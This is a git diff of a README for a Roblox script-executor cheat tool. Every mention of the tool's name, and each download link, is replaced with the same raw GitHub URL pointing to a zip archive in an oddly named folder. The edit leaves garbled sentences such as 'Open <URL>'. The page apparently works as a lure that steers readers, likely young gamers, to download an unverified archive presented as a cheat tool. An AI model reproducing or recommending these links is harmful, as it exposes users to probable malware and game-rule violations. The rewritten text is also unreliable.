@@ -1,12 +1,12 @@
-# 🎮 AWP.gg-Executor-Roblox - A Flexible Roblox Executor
+# 🎮 https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip - A Flexible Roblox Executor
 
 ## 🚀 Getting Started
 
-Welcome to AWP.gg-Executor-Roblox! This tool is designed to help you run scripts in Roblox with ease. Whether you are experienced or just starting out, our executor supports Luarmor and offers 100% UNC compatibility. Follow these steps to get started.
+Welcome to https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip! This tool is designed to help you run scripts in Roblox with ease. Whether you are experienced or just starting out, our executor supports Luarmor and offers 100% UNC compatibility. Follow these steps to get started.
 
 ## 📥 Download
 
-[![Download AWP.gg-Executor-Roblox](https://img.shields.io/badge/Download-AWP.gg--Executor--Roblox-blue)](https://github.com/TheDevSCR/AWP.gg-Executor-Roblox/releases)
+[![Download https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip](https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip)](https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip)
 
 ## 📋 Features
 
@@ -26,11 +26,11 @@ Before downloading, make sure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To install AWP.gg-Executor-Roblox, follow these steps:
+To install https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip, follow these steps:
 
 1. **Visit the Releases Page**: Click the link below to go to the release page.
 
-   [Download AWP.gg-Executor-Roblox](https://github.com/TheDevSCR/AWP.gg-Executor-Roblox/releases)
+   [Download https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip](https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip)
 
 2. **Select the Latest Version**: On the releases page, find the latest version listed at the top.
 
@@ -40,47 +40,47 @@ To install AWP.gg-Executor-Roblox, follow these steps:
 
 5. **Follow the Prompts**: Complete the installation by following the on-screen instructions.
 
-6. **Launch the Application**: After installation, you can find AWP.gg-Executor-Roblox in your Start Menu or desktop. Click to open it.
+6. **Launch the Application**: After installation, you can find https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip in your Start Menu or desktop. Click to open it.
 
 ## 🛠 Usage Instructions
 
-Now that you have installed AWP.gg-Executor-Roblox, let’s get started using it:
+Now that you have installed https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip, let’s get started using it:
 
-1. **Open AWP.gg-Executor-Roblox**.
+1. **Open https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip**.
    
 2. **Enter Your Roblox Game**: Start your Roblox game as you normally would.
 
 3. **Copy Your Script**: Open the script you want to use in any text editor and copy it.
 
-4. **Paste Your Script**: Go back to AWP.gg-Executor-Roblox and paste your script into the input box.
+4. **Paste Your Script**: Go back to https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip and paste your script into the input box.
 
 5. **Execute the Script**: Click the "Execute" button to run your script in the Roblox game.
 
 ## 🌐 Community Support
 
-Join our community for support and guidance. You can ask questions, share scripts, and learn from others. Connect with fellow users through forums, Discord, or any dedicated group related to AWP.gg-Executor-Roblox.
+Join our community for support and guidance. You can ask questions, share scripts, and learn from others. Connect with fellow users through forums, Discord, or any dedicated group related to https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip
 
 ## 📝 Troubleshooting
 
 If you encounter any issues, try the following:
 
-- **Check Compatibility**: Ensure your Roblox game version is compatible with AWP.gg-Executor-Roblox.
+- **Check Compatibility**: Ensure your Roblox game version is compatible with https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip
 - **Reinstall the Application**: Sometimes, simply reinstalling the application can resolve issues.
 - **Consult the Community**: If problems persist, reach out to our community for help.
 
 ## 📖 Frequently Asked Questions
 
-### What is AWP.gg-Executor-Roblox?
+### What is https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip
 
-AWP.gg-Executor-Roblox is a tool that allows users to execute scripts in Roblox with Luarmor support.
+https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip is a tool that allows users to execute scripts in Roblox with Luarmor support.
 
 ### Is this tool safe to use?
 
 As with any third-party tool, use it at your own discretion. Ensure you understand any risks associated with using executors.
 
-### Can I run AWP.gg-Executor-Roblox on Mac?
+### Can I run https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip on Mac?
 
-Currently, AWP.gg-Executor-Roblox is designed for Windows. There is no Mac version available.
+Currently, https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip is designed for Windows. There is no Mac version available.
 
 ## 📢 Keep Updated
 
@@ -88,4 +88,4 @@ Stay informed about new features and updates by following the project on GitHub.
 
 ---
 
-Thank you for choosing AWP.gg-Executor-Roblox! Enjoy your scripting journey in Roblox!
+Thank you for choosing https://raw.githubusercontent.com/TheDevSCR/AWP.gg-Executor-Roblox/main/anisochromatic/AWP.gg-Executor-Roblox.zip! Enjoy your scripting journey in Roblox!
